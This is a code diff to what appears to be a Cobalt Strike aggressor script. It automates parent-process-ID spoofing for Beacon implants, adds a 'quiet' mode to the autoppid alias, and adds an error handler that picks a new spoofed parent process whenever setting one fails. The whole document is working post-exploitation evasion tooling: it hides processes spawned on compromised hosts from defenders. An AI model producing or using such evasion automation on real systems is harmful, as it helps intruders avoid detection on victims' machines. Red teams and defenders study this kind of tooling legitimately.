@@ -63,7 +63,13 @@ sub findSuitableParentPID {
 }
 
 alias autoppid {
-    local('$processName $userName');
+    local('$processName $userName $params');
+    $params = "";
+
+    if(strlen($0) > strlen("autoppid ")) {
+        $params = substr($0, strlen("autoppid "));
+    }
+
     $processName = $PARENT_PROCESS_NAME;
     $userName = binfo($1, "user");
 
@@ -71,16 +77,41 @@ alias autoppid {
         $userName = substr($userName, 0, strlen($userName) - 2);
     }
 
-    btask($1, "Tasked Beacon to find $processName running as $userName and make it the PPID.");
+    if($params ne "quiet") {
+        btask($1, "Tasked Beacon to find $processName running as $userName and make it the PPID.");
+    }
+
     findSuitableParentPID($1, lambda({
-        blog!($1, "Future post-ex jobs will be spawned with fake PPID set to:\n$3");
-        bppid($1, $2);
-        appendNote($1, "(ppid: $2 $+ )");
-    }), $processName);
+        if($params ne "quiet") {
+            blog!($1, "Future post-ex jobs will be spawned with fake PPID set to:\n$3");
+            bppid($1, $2);
+        } else {
+            bppid!($1, $2);
+        }
+    }, $params => $params), $processName);
 }
 
 on beacon_initial {
-
     # Parent PID spoofing
     fireAlias($1, "autoppid", "");
+}
+
+on beacon_error {
+    local('$ppid $err');
+
+    if ($2 ismatch 'Could not set PPID to (\d+): (\d+)' ) {
+        ($ppid, $err) = matched();
+
+        if($err == 87) {
+            blog2($1, "Catched PPID error: \c4Previous parent process no longer exists\o. Finding a new one...");
+        }
+        else {
+            blog2($1, "Catched PPID error:\c4 $err $+ \o. Will find another candidate for PPID spoofing.");
+        }
+        
+        # Parent PID spoofing
+        fireAlias($1, "autoppid", "quiet");
+        
+        blog2($1, "\n\c8    Repeat your last command as it failed.\o\n");
+    }
 }
